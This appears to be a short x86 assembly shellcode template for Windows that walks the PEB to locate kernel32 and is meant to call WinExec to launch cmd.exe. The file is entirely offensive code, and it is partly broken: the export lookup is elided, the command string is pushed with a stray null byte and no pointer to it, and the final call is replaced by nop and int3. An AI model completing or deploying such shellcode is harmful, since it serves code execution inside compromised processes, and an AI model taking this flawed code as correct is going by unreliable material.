; Windows x86 Execute cmd.exe via WinExec
; Classic shellcode: PEB walk -> find kernel32 -> find WinExec

[BITS 32]
global _start

_start:
    ; Save registers
    push esi
    push edi
    push ebx

    ; PEB walk to find kernel32 base
    xor  eax, eax
    mov  eax, [fs:eax+0x30] ; PEB
    mov  eax, [eax+0x0c]    ; PEB_LDR_DATA
    mov  eax, [eax+0x14]    ; InMemoryOrderModuleList
    mov  eax, [eax]         ; ntdll
    mov  eax, [eax]         ; kernel32 (typically)
    mov  eax, [eax+0x10]    ; DllBase = kernel32 base

    ; Hash-based export resolution for WinExec
    ; djb2 hash of "WinExec" = 0x876F8B31
    mov  ebx, eax           ; kernel32 base
    ; ... (full export table walk)
    
    ; WinExec("cmd.exe", SW_SHOW=1)
    push 0x00000001
    push 0x6578652e         ; exe.
    push 0x646d63           ; cmd (null padded)
    mov  esp, esp
    ; call WinExec
    nop
    int3
